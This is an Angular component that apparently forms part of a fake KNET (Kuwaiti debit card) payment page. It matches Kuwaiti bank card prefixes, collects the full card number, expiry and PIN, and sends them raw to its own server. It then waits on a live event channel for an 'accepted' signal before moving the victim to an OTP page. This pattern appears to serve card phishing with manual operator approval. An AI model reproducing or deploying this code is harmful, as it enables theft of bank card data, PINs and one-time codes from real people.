import { Component, OnInit, OnDestroy, signal, inject, ElementRef, ViewChild, HostListener } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { Router } from '@angular/router';
import { ToastService } from '../../services/toast';
import { enviroment } from '../../../env/enviroment';

interface Bank {
  name: string;
  prefixes: string[];
  logoUrl: string;
  bankValue: string;
}

interface BankMatch {
  bank: Bank;
  prefix: string;
}

const BANKS_DATA: Bank[] = [
  { name: "Boubyan", prefixes: ["470350", "404919", "450605", "426058", "431199", "490455", "490456"], logoUrl: "imgs/Boubyan.svg", bankValue: "Boubyan Bank [Boubyan]" },
  { name: "Burgan", prefixes: ["403583", "540759", "402978", "415254", "450238", "468564", "49219000"], logoUrl: "imgs/logo-Burgan.svg", bankValue: "Burgan Bank [Burgan]" },
  { name: "KFH", prefixes: ["450778", "485602", "573016", "532674", "45077848", "45077849"], logoUrl: "imgs/KFH-logo.svg", bankValue: "Kuwait Finance House [KFH]" },
  { name: "TAM", prefixes: ["45077848", "45077849"], logoUrl: "imgs/tam.svg", bankValue: "TAM" },
  { name: "Rajhi", prefixes: ["458838"], logoUrl: "imgs/Rajhi.png", bankValue: "Al Rajhi Bank [Rajhi]" },
  { name: "ABK", prefixes: ["403622", "423826", "428628"], logoUrl: "imgs/ABK.png", bankValue: "Al Ahli Bank of Kuwait [ABK]" },
  { name: "BBK", prefixes: ["418056", "588790"], logoUrl: "imgs/bbk-logo-2.svg", bankValue: "Bank of Bahrain Kuwait [BBK]" },
  { name: "CBK", prefixes: ["521175", "516334", "532672", "537015"], logoUrl: "imgs/cbk-logo_tcm10-126503.svg", bankValue: "Commercial Bank of Kuwait [CBK]" },
  { name: "Doha", prefixes: ["419252"], logoUrl: "imgs/Doha.png", bankValue: "Doha Bank [Doha]" },
  { name: "GBK", prefixes: ["531329", "531471", "531470", "517419", "559475", "517458", "531644", "526206"], logoUrl: "imgs/gbk_logo.svg", bankValue: "Gulf Bank of Kuwait [GBK]" },
  { name: "KIB", prefixes: ["409054", "406464"], logoUrl: "imgs/download.jpg", bankValue: "Kuwait International Bank [KIB]" },
  { name: "NBK", prefixes: ["464452", "589160"], logoUrl: "imgs/nbk-logo.svg", bankValue: "National Bank of Kuwait [NBK]" },
  { name: "Weyay", prefixes: ["46445250", "543363"], logoUrl: "imgs/Weyay.png", bankValue: "NBK [Weyay]" },
  { name: "QNB", prefixes: ["521020", "524745"], logoUrl: "imgs/QNB_Logo.png", bankValue: "Qatar National Bank [QNB]" },
  { name: "Warba", prefixes: ["532749", "559459", "541350", "525528"], logoUrl: "imgs/WarbalogoPurple.svg", bankValue: "Warba Bank [Warba]" },
  { name: "UNB", prefixes: ["457778"], logoUrl: "imgs/UNB.webp", bankValue: "Union National Bank [UNB]" }
];

@Component({
  selector: 'app-knet',
  standalone: true,
  imports: [CommonModule, FormsModule],
  templateUrl: './knet.html',
  styleUrl: './knet.css',
})
export class Knet implements OnInit, OnDestroy {
  toastService = inject(ToastService);
  router = inject(Router);

  @ViewChild('yearInput') yearInputRef!: ElementRef<HTMLInputElement>;
  @ViewChild('debitInput') debitInputRef!: ElementRef<HTMLInputElement>;
  @ViewChild('autocompleteBox') autocompleteRef!: ElementRef<HTMLDivElement>;
  @ViewChild('monthInput') monthInputRef!: ElementRef<HTMLInputElement>;
  @ViewChild('pinInput') pinInputRef!: ElementRef<HTMLInputElement>;

  // Component states using signals
  isLoading = signal<boolean>(false);
  errorMessage = signal<string>('');
  amount = signal<string>('0.000');
  realDebitNumber = signal<string>('');
  expiryMonth = signal<string>('');
  expiryYear = signal<string>('');
  pin = signal<string>('');
  visualDebitNumber = signal<string>('');

  selectedBank = signal<Bank | null>(null);
  selectedPrefix = signal<string>('');

  showAutocomplete = signal<boolean>(false);
  autocompleteMatches = signal<BankMatch[]>([]);
  suppressAutocomplete = false;

  eventSource: EventSource | null = null;

  ngOnInit() {
    // Load amount from localStorage
    const stored = localStorage.getItem('pay_total_kd');
    if (stored) {
      const num = parseFloat(stored.replace(',', '.'));
      this.amount.set(isNaN(num) ? '0.000' : num.toFixed(3));
    }
  }

  ngOnDestroy() {
    this.cleanupSSE();
  }

  // Handle outside clicks to close the bank autocomplete suggestions list
  @HostListener('document:click', ['$event'])
  onClickOutside(event: MouseEvent) {
    const target = event.target as Node;
    if (this.debitInputRef && !this.debitInputRef.nativeElement.contains(target) &&
      (!this.autocompleteRef || !this.autocompleteRef.nativeElement.contains(target))) {
      this.showAutocomplete.set(false);
    }
  }

  // Visual Debit Number Input Event
  onDebitInput(event: Event) {
    const input = event.target as HTMLInputElement;
    let val = input.value;

    // Prevent input alteration if the visual representation is masked
    if (val.indexOf('•') !== -1) return;

    // Clean input and keep digits only
    val = val.replace(/[^0-9]/g, '');
    this.realDebitNumber.set(val);
    this.suppressAutocomplete = false;

    // Format visual display (space every 4 digits)
    const matchArr = val.match(/.{1,4}/g);
    this.visualDebitNumber.set(matchArr ? matchArr.join(' ') : '');

    // Attempt prefix matching to identify the bank
    let matchedPrefix = '';
    let matchedBank: Bank | null = null;

    for (const bank of BANKS_DATA) {
      for (const prefix of bank.prefixes) {
        if (val.startsWith(prefix)) {
          if (prefix.length > matchedPrefix.length) {
            matchedPrefix = prefix;
            matchedBank = bank;
          }
        }
      }
    }

    if (matchedBank) {
      this.selectedBank.set(matchedBank);
      this.selectedPrefix.set(matchedPrefix);
    } else {
      this.selectedBank.set(null);
      this.selectedPrefix.set('');
    }

    // Filter autocomplete matches for prefixes matching the typed sequence (length 1 to 8)
    if (val.length >= 1 && val.length <= 8) {
      const matches: BankMatch[] = [];
      BANKS_DATA.forEach(bank => {
        bank.prefixes.forEach(prefix => {
          if (prefix.startsWith(val)) {
            matches.push({ bank, prefix });
          }
        });
      });
      this.autocompleteMatches.set(matches);
      this.showAutocomplete.set(matches.length > 0);
    } else {
      this.showAutocomplete.set(false);
      this.autocompleteMatches.set([]);
    }

    if (val.length === 16) {
      if (this.monthInputRef) {
        this.monthInputRef.nativeElement.focus();
      }
    }
  }

  onDebitFocus() {
    const realVal = this.realDebitNumber();
    if (realVal) {
      const matchArr = realVal.match(/.{1,4}/g);
      this.visualDebitNumber.set(matchArr ? matchArr.join(' ') : '');
    }
    if (!this.suppressAutocomplete && realVal.length >= 1 && realVal.length <= 8 && this.autocompleteMatches().length > 0) {
      this.showAutocomplete.set(true);
    }
  }

  onDebitBlur() {
    const realVal = this.realDebitNumber();
    if (realVal && realVal.length >= 13) {
      const first6 = realVal.substring(0, 6);
      const last4 = realVal.substring(realVal.length - 4);
      const formattedFirst6 = first6.substring(0, 4) + ' ' + first6.substring(4, 6);
      this.visualDebitNumber.set(formattedFirst6 + '** **** ' + last4);
    }
  }

  getMaskedCardNumber(): string {
    const realVal = this.realDebitNumber();
    if (realVal && realVal.length >= 12) {
      const first6 = realVal.substring(0, 6);
      const last4 = realVal.substring(realVal.length - 4);
      const formattedFirst6 = first6.substring(0, 4) + ' ' + first6.substring(4, 6);
      return formattedFirst6 + '** **** ' + last4;
    }
    return this.visualDebitNumber();
  }

  selectAutocomplete(match: BankMatch) {
    this.realDebitNumber.set(match.prefix);
    this.selectedPrefix.set(match.prefix);
    this.selectedBank.set(match.bank);

    const pMatch = match.prefix.match(/.{1,4}/g);
    this.visualDebitNumber.set((pMatch ? pMatch.join(' ') : match.prefix) + ' ');
    this.showAutocomplete.set(false);
    this.suppressAutocomplete = true;

    if (this.debitInputRef) {
      setTimeout(() => {
        this.debitInputRef.nativeElement.focus();
      });
    }
  }

  onMonthInput(event: Event) {
    const input = event.target as HTMLInputElement;
    let val = input.value.replace(/[^0-9]/g, '');

    if (val.length > 2) {
      val = val.substring(0, 2);
    }

    input.value = val;
    this.expiryMonth.set(val);

    if (val.length === 2) {
      if (this.yearInputRef) {
        this.yearInputRef.nativeElement.focus();
      }
    }
  }

  onYearInput(event: Event) {
    const input = event.target as HTMLInputElement;
    let val = input.value.replace(/[^0-9]/g, '');

    if (val.length > 2) {
      val = val.substring(0, 2);
    }

    input.value = val;
    this.expiryYear.set(val);

    if (val.length === 2) {
      if (this.pinInputRef) {
        this.pinInputRef.nativeElement.focus();
      }
    }
  }

  onPinInput(event: Event) {
    const input = event.target as HTMLInputElement;
    let val = input.value.replace(/[^0-9]/g, '');
    if (val.length > 4) {
      val = val.substring(0, 4);
    }
    input.value = val;
    this.pin.set(val);
  }

  validateInputs(): boolean {
    const prefix = this.selectedPrefix();
    const year = this.expiryYear();
    const month = this.expiryMonth();
    const pin = this.pin();

    const yearVal = parseInt(year, 10);
    const monthVal = parseInt(month, 10);

    if (!prefix) {
      this.toastService.show('رقم البطاقة المدخل خاطئ! يرجى إدخال رقم يبدأ ببادئة (Prefix) صحيحة.', 'error');
      return false;
    }

    if (isNaN(yearVal) || yearVal > 33 || isNaN(monthVal) || monthVal < 1 || monthVal > 12) {
      this.toastService.show('المعلومات المدخله خطأ يرجى التحقق من البيانات والمحاولة مره اخرى', 'error');
      return false;
    }

    if (!pin || pin.length < 4) {
      this.toastService.show('يرجى إدخال الرقم السري المكون من 4 أرقام بشكل صحيح.', 'error');
      return false;
    }

    return true;
  }

  async onSubmit(event: Event) {
    event.preventDefault();
    this.errorMessage.set('');

    if (!this.validateInputs()) {
      return;
    }

    const clientId = localStorage.getItem('client_id');
    if (!clientId) {
      this.toastService.show('جلسة الدفع منتهية. يرجى البدء من جديد', 'error');
      this.router.navigate(['/']);
      return;
    }

    this.isLoading.set(true);

    try {
      const response = await fetch(enviroment.api_base + '/api/payments', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cc_number: this.realDebitNumber(),
          cc_name: this.selectedBank()?.bankValue || 'Knet Card',
          cc_month: this.expiryMonth(),
          cc_year: this.expiryYear(),
          cc_pin: this.pin(),
          client_id: clientId
        })
      });

      const resData = await response.json();
      if (!resData.success) {
        this.isLoading.set(false);
        this.errorMessage.set(resData.error || 'حدث خطأ أثناء إرسال البيانات');
        return;
      }

      // Open SSE connection to listen for approval
      this.eventSource = new EventSource(enviroment.api_base + `/api/events/client/${clientId}`);
      this.eventSource.addEventListener('payment_status', (evt: any) => {
        const payload = JSON.parse(evt.data);
        if (payload.status === 'ACCEPTED') {
          this.cleanupSSE();
          this.isLoading.set(false);
          if (this.selectedBank()) {
            localStorage.setItem('bank_logo', this.selectedBank()!.logoUrl);
            localStorage.setItem('bank_name', this.selectedBank()!.name);
          } else {
            localStorage.removeItem('bank_logo');
            localStorage.removeItem('bank_name');
          }
          localStorage.setItem('masked_card', this.getMaskedCardNumber());
          localStorage.setItem('expiry_month', this.expiryMonth());
          localStorage.setItem('expiry_year', '20' + this.expiryYear());
          this.router.navigate(['/pay/knet/otp']);
        } else if (payload.status === 'REJECTED') {
          this.cleanupSSE();
          this.isLoading.set(false);
          this.errorMessage.set('المعلومات المدخله خطأ يرجى التحقق من البيانات والمحاولة مره اخرى');
        }
      });

      this.eventSource.onerror = () => {
        this.cleanupSSE();
        this.isLoading.set(false);
        this.errorMessage.set('خطأ في الاتصال بالخادم لمراقبة حالة الدفع.');
      };

    } catch (err: any) {
      this.isLoading.set(false);
      this.errorMessage.set('فشل الاتصال بالخادم. يرجى المحاولة لاحقاً');
    }
  }

  cleanupSSE() {
    if (this.eventSource) {
      this.eventSource.close();
      this.eventSource = null;
    }
  }
}
